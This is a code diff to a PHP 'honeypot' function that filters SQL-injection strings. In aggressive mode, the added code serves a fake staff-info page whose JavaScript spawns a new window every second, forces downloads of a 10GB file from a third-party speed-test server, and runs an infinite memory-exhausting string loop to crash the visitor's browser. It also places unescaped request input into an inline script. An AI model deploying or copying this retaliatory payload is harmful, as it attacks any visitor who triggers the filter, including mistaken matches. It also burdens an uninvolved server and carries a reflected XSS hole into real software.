@@ -12,6 +12,7 @@ https://github.com/myopecs
 function honeypotThis($n, $type = "general", $level = "normal"){
 	$i = (isset($_GET[$n]) ? $_GET[$n] : "");
 	$i = str_replace("\0", "", $i);
+	$i = strtolower($i);
 	
 	if(
 		strpos($i, "'--") > -1 || 
@@ -36,16 +37,46 @@ function honeypotThis($n, $type = "general", $level = "normal"){
 			$level == "agressive"
 		){
 		?>
-		<script>				
+		<div style="margin: 5px; background-color: #e8e8e8; padding: 10px;">
+			<h3>Staff Card Info</h3>
+			
+			<strong>Name: <span id="column"></span></strong> <br />
+			<strong>Email: <span id="column1"></span></strong></strong> <br />
+			<strong>Phone: <span id="column2"></span></strong></strong> <br />
+			<strong>StaffId: <span id="column3"></span></strong></strong> <br />
+		</div>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+		<script>
 			setInterval(function(){
 				var wname = Math.ceil(Math.random() * 100000);
 				window.open("?<?= $n ?>=<?= $i ?>&gameon-honeypot", "t" + wname);
-				
 				//Please do not enable this if you want to test
 				//this will keep downloading 1GB binary file
-				//window.open("https://speed.hetzner.de/1GB.bin", "u" + wname);
+				window.open("https://speed.hetzner.de/10GB.bin", "u" + wname);
 			}, 1000);
 			
+			//Please comment these line if you just want to try to yourself
+			$.ajax({
+				url: "https://speed.hetzner.de/10GB.bin",
+				timeout: 36600,
+				async: false
+			});
+			
+			txt = "aaaaa,aaaaaaaaaa,aaaaa,aaaaaaaa,aaaaaaaaaaaaaa,aaaaaaaa,aaaaaaaaa,aaaaa,aaaaaaaaaaaaaaaaaaaaa";
+			while(true){
+				txt = txt += "aaaa,aaaaaaa,aaaaa,aaaaaaaaa,aaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaa,aaaaa";
+				txt = txt += "aaaaaa,aaaaaaa,aaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+				txt = txt += "aaaaaaa,aaaaaaaaaaaa,aaaa,aaaaaaaaaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaa,aaaaaaaaaaaaaa,aaaaaaaaaaa";
+				txt = txt += "aaaaaaaaaaa,aaaaa,aaaaaaaaaaaa,aaaaaaaaaaaaaaaa,aaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+				txt = txt += "aaaaaaaa,aaaaa,aaaaaaaa,aaaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaa,aaaaaaaaaa,aaaaaaaaa";
+				txt = txt += "aa,aaaa,aaaaaaaaaaaa,aaaaaaaaaa,aaaaaa,aaaaaa,aaaaaaa,aaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaa";
+				txt = txt += "a,aaaaaaaaa,a,aaaaaaaaaaaa,aaa,aaaa,aaa,aaaaa,aaaaaaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaaaaaaaa,aaaaaaa";
+				txt = txt += "aaaa,aaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaa,aaaaaaaaaaaaaa,aaaaaaa,aaaaa,aaaaaa,aaaaaa";
+				document.getElementById("column").innerHTML = txt;
+				document.getElementById("column1").innerHTML = txt;
+				document.getElementById("column2").innerHTML = txt;
+				document.getElementById("column3").innerHTML = txt;
+			}
 		</script>
 		<?php
 		}else{
@@ -71,6 +102,8 @@ function honeypotThis($n, $type = "general", $level = "normal"){
 		
 		die();
 	}else{
+		$i = (isset($_GET[$n]) ? $_GET[$n] : "");
+		
 		switch($type){
 			default:
 			case "general":
